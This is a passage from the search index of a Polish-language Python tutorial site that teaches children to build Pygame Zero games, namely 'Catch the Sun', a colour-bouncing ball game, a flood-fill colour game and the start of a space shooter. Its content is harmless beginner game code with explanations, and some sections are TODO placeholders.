porusza si\u0119 ju\u017c w bardziej sensowny spos\u00f3b.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#zliczanie-punktow","title":"Zliczanie punkt\u00f3w","text":"<p>Czas na zliczanie punkt\u00f3w. W tym celu b\u0119dziemy potrzebowali miejsca (zmienn\u0105), gdzie zapami\u0119tamy punkty. Wy\u015bwietlimy je na ekranie i b\u0119dziemy dodawa\u0107 (lub odejmowa\u0107) za ka\u017cde klikni\u0119cie.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#wyswietlamy-punkty","title":"Wy\u015bwietlamy punkty","text":"<p>Na pocz\u0105tku dopiszemy punkty do naszego aktora, podobnie jak zrobili\u015bmy z parametrem timer. Punkty zaczynamy zlicza\u0107 od zera, a nazwiemy je points, czyli punkty z angielskiego.</p> <pre><code>sun = Actor(\"sun\")\nsun.timer = 0\nsun.points = 0\n</code></pre> <p>Teraz czas wy\u015bwietli\u0107 punkty na ekranie, tak aby\u015bmy mogli sprawdza\u0107, czy naliczaj\u0105 si\u0119 poprawnie. W tym celu skorzystamy z metody <code>screen.draw.text</code>, kt\u00f3r\u0105 umie\u015bcimy na samym ko\u0144cu cz\u0119\u015bci rysuj\u0105cej (<code>draw</code>). Do tej metody musimy przekaza\u0107 kilka parametr\u00f3w. W celu u\u0142atwienia sobie pracy, przed warto\u015bci\u0105 ka\u017cdego parametru dopiszemy jego nazw\u0119 i znak przypisania \\(=\\). Parametry, jakie przeka\u017cemy, to:</p> <ul> <li>text - Tekst do wy\u015bwietlenia na ekranie, czyli nasza liczba punkt\u00f3w. Poniewa\u017c musimy poda\u0107 tekst, a nie liczb\u0119, to punkty zamieniamy na tekst za pomoc\u0105 funkcji str: <code>str(sun.points)</code>.</li> <li>center - Wsp\u00f3\u0142rz\u0119dne miejsca, w kt\u00f3rym ma si\u0119 znale\u017a\u0107 \u015brodek wy\u015bwietlanego tekstu. Chcemy, aby punkty by\u0142y wy\u015bwietlane na \u015brodku ekranu (czyli w po\u0142owie szeroko\u015bci), u g\u00f3ry (np. \\(50\\) pikseli od g\u00f3ry). W takim razie podajemy par\u0119 wsp\u00f3\u0142rz\u0119dnych zapisan\u0105 w nawiasach okr\u0105g\u0142ych: <code>(WIDTH / 2, 50)</code>.</li> <li>color - Kolor wy\u015bwietlanego tekstu. Podobnie jak przy tle mo\u017cemy wybra\u0107 w\u0142asny kolor, np. czerwony (red).</li> <li>fontsize - Rozmiar czcionki. Je\u017celi chcemy, by punkty by\u0142y dobrze widoczne, warto poda\u0107 jak\u0105\u015b du\u017c\u0105 warto\u015b\u0107, np. \\(100\\).</li> </ul> <p>Pe\u0142ne wywo\u0142anie metody <code>screen.draw.text</code> b\u0119dzie wi\u0119c wygl\u0105da\u0142o nast\u0119puj\u0105co:</p> <pre><code>def draw():\n    ...\n    screen.draw.text(text=str(sun.points), center=(WIDTH / 2, 50), color=\"red\", fontsize=100)\n</code></pre> <p>Pe\u0142na implementacja funkcji rysuj\u0105cej wygl\u0105da natomiast tak:</p> <pre><code>def draw():\n    screen.fill(\"skyblue\")\n    sun.draw()\n    screen.draw.text(text=str(sun.points), center=(WIDTH / 2, 50), color=\"red\", fontsize=100)\n</code></pre> <p>Teraz mo\u017cemy uruchomi\u0107 nasz\u0105 gr\u0119 i zobaczy\u0107, czy podoba nam si\u0119 spos\u00f3b wy\u015bwietlania punkt\u00f3w. Je\u017celi nie, to zawsze mo\u017cemy go poprawi\u0107.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#zliczanie-punktow_1","title":"Zliczanie punkt\u00f3w","text":"<p>W celu zliczania punkt\u00f3w skorzystamy z funkcji odczytuj\u0105cej klikni\u0119cia na ekranie. Funkcja ta nazywa si\u0119 <code>on_mouse_down</code> i przyjmuje parametr <code>pos</code> okre\u015blaj\u0105cy pozycj\u0119, czyli wsp\u00f3\u0142rz\u0119dne klikni\u0119cia myszy na ekranie.</p> <p>Nasz\u0105 now\u0105 funkcj\u0119 dopisujemy na ko\u0144cu naszego kodu, zaraz pod cz\u0119\u015bci\u0105 aktualizuj\u0105c\u0105 (update), ale przed wywo\u0142aniem <code>pgzrun.go()</code>.</p> <pre><code>def on_mouse_down(pos):\n</code></pre> <p>Wewn\u0105trz funkcji sprawdzamy, czy klikn\u0119li\u015bmy w s\u0142o\u0144ce, czy te\u017c nie. Sprawdzimy to za pomoc\u0105 instrukcji warunkowej (if), a tak\u017ce skorzystamy z metody collidepoint, kt\u00f3ra pozwala sprawdzi\u0107, czy zadany aktor (w naszym przypadku s\u0142o\u0144ce) jest w kolizji z punktem na ekranie (w naszym przypadku z miejscem klikni\u0119cia myszy). Metod\u0119 t\u0105 wywo\u0142amy na naszym aktorze sun, a przeka\u017cemy do niej jako paramter wsp\u00f3\u0142rz\u0119dne klikni\u0119cia myszy (pos).</p> <p>Nasza instrukcja b\u0119dzie wi\u0119c wygl\u0105da\u0142a nast\u0119puj\u0105co:</p> <pre><code>def on_mouse_down(pos):\n    if sun.collidepoint(pos):\n</code></pre> <p>Je\u017celi faktycznie uda\u0142o nam si\u0119 klikn\u0105\u0107 w s\u0142o\u0144ce, to powinni\u015bmy zrobi\u0107 dwie rzeczy: zwi\u0119kszy\u0107 liczb\u0119 punkt\u00f3w o jeden (<code>sun.points += 1</code>) oraz zresetowa\u0107 timer (<code>sun.timer = 0</code>). Spr\u00f3bujmy wi\u0119c to zapisa\u0107.</p> <pre><code>def on_mouse_down(pos):\n    if sun.collidepoint(pos):\n        sun.points += 1\n        sun.timer = 0\n</code></pre> <p>Co jednak w przeciwnym przypadku (else), gdy nie uda\u0142o nam si\u0119 trafi\u0107 w s\u0142o\u0144ce? Wtedy powinni\u015bmy straci\u0107 jeden punkt (<code>sun.points -= 1</code>) i tak\u017ce zresetowa\u0107 timer (<code>sun.timer = 0</code>). Nasza funkcja b\u0119dzie wi\u0119c wygl\u0105da\u0142a nast\u0119puj\u0105co:</p> <pre><code>def on_mouse_down(pos):\n    if sun.collidepoint(pos):\n        sun.points += 1\n        sun.timer = 0\n    else:\n        sun.points -= 1\n        sun.timer = 0\n</code></pre> <p>Warto w tym momencie uruchomi\u0107 nasz\u0105 gr\u0119 i sprawdzi\u0107, jak zmieniaj\u0105 si\u0119 punkty wy\u015bwietlane na ekranie.</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#zwiekszanie-poziomu-trudnosci","title":"Zwi\u0119kszanie poziomu trudno\u015bci","text":"<p>Aby gra stawa\u0142a si\u0119 tym trudniejsza, im wi\u0119cej mamy punkt\u00f3w, uzale\u017cnijmy warto\u015b\u0107 parametru timer od liczby zdobytych punkt\u00f3w. W tym celu zmodyfikujemy linijk\u0119 w cz\u0119\u015bci aktualizuj\u0105cej, gdzie resetujemy nasz licznik. Mo\u017cemy to zrobi\u0107 na kilka sposob\u00f3w. Jednym z pomys\u0142\u00f3w jest odj\u0119cie od liczby \\(60\\) (reprezentuj\u0105cej jedn\u0105 sekund\u0119) liczby zdobytych punkt\u00f3w. W ten spos\u00f3b, im wi\u0119cej b\u0119dziemy mieli punkt\u00f3w, tym s\u0142o\u0144ce b\u0119dzie szybciej przeskakiwa\u0107 po ekranie. Natomiast jak b\u0119dzie nam s\u0142abo sz\u0142o i cz\u0119sto b\u0119dziemy traci\u0107 punkty, to s\u0142o\u0144ce b\u0119dzie wolniejsze i \u0142atwiejsze do z\u0142apania.</p> <p>W ostatniej linijce cz\u0119\u015bci update zamiast <code>sun.timer = 60</code> zapisujemy <code>sun.timer = 60 - sun.points</code>.</p> <p>Pe\u0142na implementacja funkcji aktualizuj\u0105cej wygl\u0105da wi\u0119c teraz nast\u0119puj\u0105co:</p> <pre><code>def update():\n    sun.timer -= 1\n\n    if sun.timer &lt;= 0:\n        sun.x = random.randint(80, WIDTH - 80)\n        sun.y = random.randint(80, HEIGHT - 80)\n        sun.timer = 60 - sun.points\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#peny-kod_1","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nsun = Actor(\"sun\")\nsun.timer = 0\n# Zliczamy zdobyte przez gracza punkty\nsun.points = 0\n\ndef draw():\n    screen.fill(\"skyblue\")\n    sun.draw()\n    # Wypisujemy liczb\u0119 punkt\u00f3w\n    screen.draw.text(text=str(sun.points), center=(WIDTH / 2, 50), color=\"red\", fontsize=100)\n\ndef update():\n    sun.timer -= 1\n\n    if sun.timer &lt;= 0:\n        sun.x = random.randint(80, WIDTH - 80)\n        sun.y = random.randint(80, HEIGHT - 80)\n        # Ustalamy pocz\u0105tkow\u0105 warto\u015b\u0107 licznika czasu\n        sun.timer = 60 - sun.points\n\n# Funkcja odczytuj\u0105ca klikni\u0119cia myszy\ndef on_mouse_down(pos):\n    # Je\u017celi klikn\u0119li\u015bmy na s\u0142o\u0144ce\n    if sun.collidepoint(pos):\n        # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w\n        sun.points += 1\n        # Zerujemy licznik czasu, aby s\u0142o\u0144ce si\u0119 przemie\u015bci\u0142o\n        sun.timer = 0\n    else: # W przeciwnym przypadku, gdy nie uda\u0142o nam si\u0119 klikn\u0105\u0107 w s\u0142o\u0144ce\n        # Zmniejszamy liczb\u0119 punkt\u00f3w\n        sun.points -= 1\n        # Zerujemy licznik czasu, aby s\u0142o\u0144ce si\u0119\u00a0przemie\u015bci\u0142o\n        sun.timer = 0\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#pena-gra","title":"Pe\u0142na gra","text":"<pre><code># Importujemy potrzebne biblioteki\nimport pgzrun\nimport random\n\n# Ustalamy wymiary okna gry\nWIDTH = 800\nHEIGHT = 600\n\n# Tworzymy aktora s\u0142o\u0144ca\nsun = Actor(\"sun\")\n# Licznik czasu\nsun.timer = 0\n# Zliczamy zdobyte przez gracza punkty\nsun.points = 0\n\n# Funkcja rysuj\u0105ca stan gry na ekranie\ndef draw():\n    # Wype\u0142niamy t\u0142o niebieskim kolorem\n    screen.fill(\"skyblue\")\n    # Rysujemy s\u0142o\u0144ce\n    sun.draw()\n    # Wypisujemy liczb\u0119 punkt\u00f3w\n    screen.draw.text(text=str(sun.points), center=(WIDTH / 2, 50), color=\"red\", fontsize=100)\n\n# Funkcja aktualizuj\u0105ca stan gry\ndef update():\n    # Zmiejszamy licznik czasu\n    sun.timer -= 1\n\n    # Je\u017celi licznik czasu spad\u0142 do zera\n    if sun.timer &lt;= 0:\n        # Wybieramy nowe, losowe wsp\u00f3\u0142rz\u0119dne po\u0142o\u017cenia s\u0142o\u0144ca na ekranie\n        sun.x = random.randint(80, WIDTH - 80)\n        sun.y = random.randint(80, HEIGHT - 80)\n        # Ustalamy pocz\u0105tkow\u0105 warto\u015b\u0107 licznika czasu\n        sun.timer = 60 - sun.points\n\n# Funkcja odczytuj\u0105ca klikni\u0119cia myszy\ndef on_mouse_down(pos):\n    # Je\u017celi klikn\u0119li\u015bmy na s\u0142o\u0144ce\n    if sun.collidepoint(pos):\n        # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w\n        sun.points += 1\n        # Zerujemy licznik czasu, aby s\u0142o\u0144ce si\u0119 przemie\u015bci\u0142o\n        sun.timer = 0\n    else: # W przeciwnym przypadku, gdy nie uda\u0142o nam si\u0119 klikn\u0105\u0107 w s\u0142o\u0144ce\n        # Zmniejszamy liczb\u0119 punkt\u00f3w\n        sun.points -= 1\n        # Zerujemy licznik czasu, aby s\u0142o\u0144ce si\u0119\u00a0przemie\u015bci\u0142o\n        sun.timer = 0\n\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre> <p>Pe\u0142na implementacja dost\u0119pna jest r\u00f3wnie\u017c poni\u017cej.</p> <p>Z\u0142ap S\u0142o\u0144ce</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#gramy","title":"Gramy","text":"<p>Czas zagra\u0107 w nasz\u0105 gr\u0119! Ile punkt\u00f3w Tobie uda si\u0119 zdoby\u0107?</p>"},{"location":"learning-by-games/python/pygame-zero/catch-the-sun/#zadanie-dodatkowe","title":"Zadanie dodatkowe","text":"<p>Spr\u00f3buj doda\u0107 do gry wy\u015bwietlanie najwi\u0119kszej liczby punkt\u00f3w, jakie uda\u0142o si\u0119 zdoby\u0107 w obecnej rozgrywce. Podpowied\u017a: dopisz now\u0105 zmienn\u0105 do s\u0142o\u0144ca i wy\u015bwietl j\u0105 na ekranie (podobnie jak punkty), a przy ka\u017cdym nowym zdobytym punkcie sprawdzaj, czy uda\u0142o si\u0119 zdoby\u0107 wi\u0119cej punkt\u00f3w ni\u017c dotychczas, a je\u017celi tak to zmie\u0144 warto\u015b\u0107 nowej zmiennej.</p>"},{"location":"learning-by-games/python/pygame-zero/colorful-ball/","title":"Kolorowa pi\u0142ka","text":""},{"location":"learning-by-games/python/pygame-zero/colorful-ball/#wstep","title":"Wst\u0119p","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/colorful-ball/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/colorful-ball/#gra","title":"Gra","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/colorful-ball/#peen-program","title":"Pe\u0142en program","text":"<p>TODO</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 800\n\nkolory = [\"#A3DDCB\", \"#E8E9A1\", \"#E6B566\", \"#E5707E\"]\n\npilka = {\"x\": WIDTH / 2, \"y\": HEIGHT - 30, \"oy\": HEIGHT - 30, \"promien\": 10, \"vy\": 0, \"kolor\": random.choice(kolory)}\n\nlinie = []\n\ndef draw():\n    screen.fill((0, 0, 0))\n\n    pilka_rect = Rect((pilka[\"x\"], pilka[\"y\"]), (pilka[\"promien\"] * 2, pilka[\"promien\"] * 2))\n\n    for linia in linie:\n        for i in range(len(linia[\"segmenty\"])):\n            kolor = linia[\"segmenty\"][i]\n            szer = WIDTH / 4\n            x = i * szer - linia[\"przes\"]\n            y = linia[\"y\"]\n            segment = Rect((x, y), (szer, 20))\n            screen.draw.filled_rect(segment, kolor)\n\n            if segment.colliderect(pilka_rect) and kolor != pilka[\"kolor\"]:\n                reset()\n\n    screen.draw.filled_circle((pilka[\"x\"], pilka[\"y\"]), pilka[\"promien\"], pilka[\"kolor\"])\n\ndef dodaj_linie(y):\n    linia = {}\n    linia[\"segmenty\"] = kolory[:]\n    random.shuffle(linia[\"segmenty\"])\n    linia[\"segmenty\"].extend(linia[\"segmenty\"])\n    linia[\"przes\"] = 0\n    linia[\"vx\"] = random.randint(2, 5)\n    linia[\"y\"] = y\n    linie.append(linia)\n\ndef update():\n    global przes\n    for linia in linie:\n        linia[\"przes\"] += linia[\"vx\"]\n        if linia[\"przes\"] &gt;= WIDTH:\n            linia[\"przes\"] = 0\n\n    pilka[\"vy\"] += 0.5\n    pilka[\"y\"] += pilka[\"vy\"]\n\n    if pilka[\"y\"] &gt;= pilka[\"oy\"]:\n        pilka[\"oy\"] = pilka[\"y\"]\n        pilka[\"vy\"] = -10\n\ndef on_key_down(key):\n    global linia_y\n    if key == keys.SPACE:\n        pilka[\"vy\"] = -10\n        pilka[\"oy\"] = pilka[\"y\"]\n        przesun()\n\ndef przesun():\n    for linia in linie[:]:\n        linia[\"y\"] += 20\n        if linia[\"y\"] &gt; HEIGHT:\n            dodaj_linie(0)\n            linie.remove(linia)\n\ndef reset():\n    global pilka\n    linie.clear()\n    dodaj_linie(WIDTH / 2)\n    dodaj_linie(WIDTH / 5)\n    dodaj_linie(-80)\n    pilka = {\"x\": WIDTH / 2, \"y\": HEIGHT - 30, \"oy\": HEIGHT - 30, \"promien\": 15, \"vy\": 0, \"kolor\": random.choice(kolory)}\n\nreset()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/colorful-ball/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>https://replit.com/@damiankurpiewski/ColorBall</p> <p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/colors-game/","title":"Gra w kolory","text":""},{"location":"learning-by-games/python/pygame-zero/colors-game/#wstep","title":"Wst\u0119p","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/colors-game/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Algorytmu Flood Fill</li> <li>TODO</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/colors-game/#gra","title":"Gra","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/colors-game/#peen-program-z-komentarzami","title":"Pe\u0142en program z komentarzami","text":"<pre><code>import pgzrun\nimport random\n\n# Szeroko\u015b\u0107 okna\nWIDTH = 800\n\n# Wysoko\u015b\u0107 okna\nHEIGHT = 600\n\n# D\u0142ugo\u015b\u0107 boku pojedy\u0144czego, kwadratowego pola\nfield_size = 20\n\n# Szeroko\u015b\u0107 ca\u0142ego pola gry - ilo\u015b\u0107 pojedy\u0144czych p\u00f3l\nfield_width = WIDTH // field_size\n\n# Wysoko\u015b\u0107 ca\u0142ego pola gry - ilo\u015b\u0107 pojedy\u0144czych p\u00f3l\nfield_height = HEIGHT // field_size\n\n# Pole gry\nfield = []\n\n# Dost\u0119pne kolory p\u00f3l gry. Pierwszy jest zarezerwowany na kolor pocz\u0105tkowy.\ncolors = [(255, 255, 255), (255, 0, 0), (0, 255, 0), (0, 0, 255), (255, 255, 0), (255, 0, 255)]\n\n# Ilo\u015b\u0107 dost\u0119pnych kolor\u00f3w\ncolors_size = len(colors)\n\n# Pocz\u0105tkowo gracze maj\u0105 pierwszy kolor z tablicy\nplayer_color = 0\ncomputer_color = 0\n\n# Zaczyna gracz\ncurrent_player = 1\n\ndef draw():\n    # Czy\u015bcimy ekran gry, wype\u0142niaj\u0105c go czarnym kolorem\n    screen.fill((0, 0, 0))\n\n    # Rysujemy pole gry\n    draw_field()\n\n# Rysowanie pola gry\ndef draw_field():\n    for x in range(field_width):\n        for y in range(field_height):\n            # Pobieramy kolor pola gry\n            field_color = field[x][y]\n\n            # Obliczamy wsp\u00f3\u0142rz\u0119dne pola na ekranie\n            field_x = x * field_size\n            field_y = y * field_size\n\n            # Tworzymy prostok\u0105t pola gry do narysowania\n            field_rect = Rect((field_x, field_y), (field_size, field_size))\n\n            # Rysujemy pole gry na ekranie\n            screen.draw.rect(field_rect, field_color)\n\ndef update():\n    global current_player\n    # Je\u017celi jest tura komputera\n    if current_player == 2:\n        # Wykonujemy ruch komputera\n        computer_move()\n        current_player = 1\n\n# Wykonujemy ruch komputera\ndef computer_move():\n    global computer_color\n\n    new_color = computer_color\n\n    # Dop\u00f3ki wylosowany ruch nie jest dozwolony\n    while new_color == computer_color or new_color == player_color:\n        # Losujemy nowy ruch\n        new_color = random.randint(1, colors_size - 1)\n\n    flood_fill(field_width - 1, field_height - 1, computer_color, new_color)\n    computer_color = new_color\n\n# Odczytujemy ruch gracza\ndef on_key_down(key):\n    global player_color, current_player\n\n    # Je\u017celi nie jest tura gracza\n    if current_player != 1:\n        # Ko\u0144czymy dzia\u0142anie funkcji\n        return\n\n    new_color = player_color\n    if key == keys.K_1:\n        new_color = 1\n\n    if key == keys.K_2:\n        new_color = 2\n\n    if key == keys.K_3:\n        new_color = 3\n\n    if key == keys.K_4:\n        new_color = 4\n\n    if key == keys.K_5:\n        new_color = 5\n\n    # Je\u017celi ruch nie jest dozwolony\n    if new_color == player_color or new_color == computer_color:\n        return\n\n    flood_fill(0, 0, player_color, new_color)\n    player_color = new_color\n    current_player = 2\n\ndef flood_fill(x, y, old_color, new_color):\n    global field\n\n    if x &lt; 0 or x &gt;= field_width:\n        return\n\n    if y &lt; 0 or y &gt;= field_height:\n        return\n\n    if field[x][y] != colors[old_color]:\n        return\n\n    field[x][y] = colors[new_color]\n    flood_fill(x + 1, y, old_color, new_color)\n    flood_fill(x - 1, y, old_color, new_color)\n    flood_fill(x, y + 1, old_color, new_color)\n    flood_fill(x, y - 1, old_color, new_color)\n\n# Przygotowanie pola gry, wype\u0142niamy je losowymi warto\u015bciami\ndef prepare_field():\n    for x in range(field_width):\n        # Dodajemy pusty wiersz\n        field.append([])\n\n        for y in range(field_height):\n            # Losujemy numer koloru, pomijaj\u0105c pierwszy z tablicy\n            random_index = random.randint(1, colors_size - 1)\n\n            # Wybieramy kolor, zgodnie z wylosowan\u0105 liczb\u0105\n            random_color = colors[random_index]\n\n            # Dodajemy nowe pole do planszy\n            field[x].append(random_color)\n\n    # Ustawiamy pocz\u0105tkowe kolory dla pocz\u0105tkowych p\u00f3l graczy\n    field[0][0] = colors[0]\n    field[field_width - 1][field_height - 1] = colors[0]\n\n# Przygotowujemy pole gry\nprepare_field()\n\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/colors-game/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>https://replit.com/@damiankurpiewski/ColorsGame</p> <p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/","title":"Kosmos","text":""},{"location":"learning-by-games/python/pygame-zero/cosmos/#wstep","title":"Wst\u0119p","text":"<p>Dzisiaj spr\u00f3bujemy zasymulowa\u0107 bardziej naturalny ruch w kosmosie. Zamiast asteroid b\u0119dziemy walczy\u0107 z wrogimi statkami przeciwnik\u00f3w, kt\u00f3rzy b\u0119d\u0105 za nami pod\u0105\u017ca\u0107 i do nas strzela\u0107! Jak d\u0142ugo uda nam si\u0119 przetrwa\u0107?</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Poruszania postaci\u0105 zgodnie z kierunkiem obrotu.</li> <li>Kierowania przeciwnik\u00f3w w stron\u0119 gracza.</li> <li>\u015aledzenia kolizji wielu element\u00f3w gry.</li> <li>Podzia\u0142u kodu na czytelne cz\u0119\u015bci.</li> <li>\u015aledzenia czasu gry.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#grafiki-do-pobrania","title":"Grafiki do pobrania","text":"<p> Grafiki do gry Kosmos</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#dzwieki-do-pobrania","title":"D\u017awi\u0119ki do pobrania","text":"<p> D\u017awi\u0119ki do gry Kosmos</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>https://kenney.nl/</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#nasz-cel","title":"Nasz cel","text":""},{"location":"learning-by-games/python/pygame-zero/cosmos/#szablon","title":"Szablon","text":"<p>Tym razem zaczniemy od bardziej rozbudowanego ni\u017c zwykle szablonu gry. Przygotujemy sobie kilka funkcji, kt\u00f3re p\u00f3\u017aniej b\u0119dziemy uzupe\u0142nia\u0107 w\u0142a\u015bciw\u0105 zawarto\u015bci\u0105. Dzi\u0119ki temu nasz kod stanie si\u0119 czytelniejszy, a nasza praca prostsza.</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#biblioteki","title":"Biblioteki","text":"<p>Opr\u00f3cz podstawowych bibliotek pgzrun do obs\u0142ugi gry oraz random do liczb losowych, przyda nam si\u0119 tak\u017ce biblioteka math do oblicze\u0144 matematycznych, kt\u00f3re b\u0119d\u0105 nam potrzebne przy ruchach postaci.</p> <pre><code>import pgzrun\nimport random\nimport math\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#konfiguracja","title":"Konfiguracja","text":"<p>Utworzymy ekran o wymiarach \\(1200\\times 1200\\). Do tego w opcjach konfiguracyjnych zapami\u0119tamy sobie tak\u017ce margines (MARGIN) o warto\u015bci \\(20\\), kt\u00f3rego b\u0119dziemy u\u017cywa\u0107 przy elementach interfejsu.</p> <pre><code>...\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#listy-elementow","title":"Listy element\u00f3w","text":"<p>W naszej grze znajdzie si\u0119 kilka rodzaj\u00f3w element\u00f3w, nie licz\u0105c samego gracza. B\u0119d\u0105 to:</p> <ul> <li>przeciwnicy (enemies_list),</li> <li>lasery wystrzelone przez gracza (player_lasers_list),</li> <li>lasery wystrzelone przez przeciwnika (enemy_lasers_list).</li> </ul> <p>Poniewa\u017c tych element\u00f3w mo\u017ce by\u0107 wiele jednocze\u015bnie na ekranie, to ka\u017cdy z typ\u00f3w zapami\u0119tamy w osobnej li\u015bcie. Na pocz\u0105tku do naszych zmiennych przypiszemy pust\u0105 list\u0119, czyli puste nawiasy kwadratowe (<code>[]</code>).</p> <pre><code>...\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#rysowanie","title":"Rysowanie","text":"<p>Jak zwykle b\u0119dzie nam potrzebna funkcja rysuj\u0105ca zmiany na ekranie (draw). Wewn\u0105trz niej wype\u0142nimy ekran czarnym (black) kolorem za pomoc\u0105 funkcji screen.fill.</p> <pre><code>...\n\ndef draw():\n    screen.fill(\"black\")\n</code></pre> <p>Poza g\u0142\u00f3wn\u0105 funkcj\u0105 rysuj\u0105c\u0105 przyda nam si\u0119 tak\u017ce pomocnicza funkcja rysuj\u0105ca wszystkie elementy z podanej listy, poniewa\u017c w naszej grze wi\u0119kszo\u015b\u0107 element\u00f3w b\u0119dziemy przechowywa\u0107 w listach. Stworzymy wi\u0119c funkcj\u0119 draw_list, kt\u00f3ra przyjmie jeden parametr: list\u0119 element\u00f3w do narysowania. Parametr nazwiemy list i podamy go w okr\u0105g\u0142ych nawiasach po nazwie funkcji: draw_list(list).</p> <pre><code>...\n\ndef draw_list(list):\n</code></pre> <p>Nasz\u0105 funkcj\u0119 uzupe\u0142nimy p\u00f3\u017aniej, teraz tworzymy tylko jej szablon, wi\u0119c dopiszemy do niej instrukcj\u0119 pass.</p> <pre><code>...\n\ndef draw_list(list):\n    pass\n</code></pre> <p>W podobny spos\u00f3b utworzymy funkcj\u0119 do rysowania \u017cy\u0107 na ekranie, kt\u00f3r\u0105 nazwiemy draw_lifes. Nie b\u0119dzie ona przyjmowa\u0107 \u017cadnych parametr\u00f3w. Dopiszemy j\u0105 zaraz pod nasz\u0105 poprzedni\u0105 funkcj\u0105 draw_list, a wype\u0142nimy jedn\u0105 instrukcj\u0105: pass.</p> <pre><code>...\n\ndef draw_lifes():\n    pass\n</code></pre> <p>Mo\u017cemy te\u017c od razu dopisa\u0107 wywo\u0142anie nowej funkcji na ko\u0144cu funkcji draw.</p> <pre><code>def draw():\n    ...\n    draw_lifes()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#aktualizacja","title":"Aktualizacja","text":"<p>Poniewa\u017c w naszej grze b\u0119dzie wiele element\u00f3w, to b\u0119dziemy musieli wiele rzeczy aktualizowa\u0107. Aby zapobiec ba\u0142aganowi w kodzie, podzielimy sobie aktualizacj\u0119 na nast\u0119puj\u0105ce funkcje:</p> <ul> <li>aktualizacja gracza (update_player),</li> <li>aktualizacja laser\u00f3w gracza (update_player_lasers),</li> <li>aktualizacja przeciwnik\u00f3w (update_enemies),</li> <li>aktualizacja laser\u00f3w przeciwnik\u00f3w (update_enemy_lasers),</li> <li>aktualizacja kolizji (update_collisions).</li> </ul> <p>Wszystkie te funkcje wywo\u0142amy po kolei w funkcji update:</p> <pre><code>...\n\ndef update():\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n</code></pre> <p>Teraz pozosta\u0142o nam stworzy\u0107 szablony tych funkcji, zaraz pod funkcj\u0105 update, wszystkie z jedn\u0105 instrukcj\u0105: pass.</p> <pre><code>...\n\ndef update_player():\n    pass\n\ndef update_player_lasers():\n    pass\n\ndef update_enemies():\n    pass\n\ndef update_enemy_lasers():\n    pass\n\ndef update_collisions():\n    pass\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#zdarzenia","title":"Zdarzenia","text":"<p>Potrzebna nam b\u0119dzie tak\u017ce funkcja odczytuj\u0105ca wci\u015bni\u0119cie klawisza na klawiaturze, z kt\u00f3rej skorzystamy w przypadku strzelania. W tym celu dopisujemy funkcj\u0119 <code>on_key_down(key)</code>, podobnie jak wcze\u015bniej z instrukcj\u0105 pass.</p> <pre><code>...\n\ndef on_key_down(key):\n    pass\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<p>Przydadz\u0105 nam si\u0119 jeszcze trzy funkcje pomocnicze:</p> <ul> <li>dodanie nowego przeciwnika (add_enemy),</li> <li>wybranie pozycji startowej dla przeciwnika i asteroidy (choose_position),</li> <li>zwi\u0119kszenie licznika czas (add_time).</li> </ul> <p>Podobnie jak wcze\u015bniej, funkcje stworzymy jako szablony i wype\u0142nimy jedynie instrukcj\u0105 pass.</p> <pre><code>...\ndef add_enemy():\n    pass\n\ndef choose_position():\n    pass\n\ndef add_time():\n    pass\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#uruchomienie-gry","title":"Uruchomienie gry","text":"<p>Pozosta\u0142o nam na samym dole naszego kodu dopisa\u0107 instrukcj\u0119 uruchamiaj\u0105c\u0105 gr\u0119.</p> <pre><code>...\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#peny-kod","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 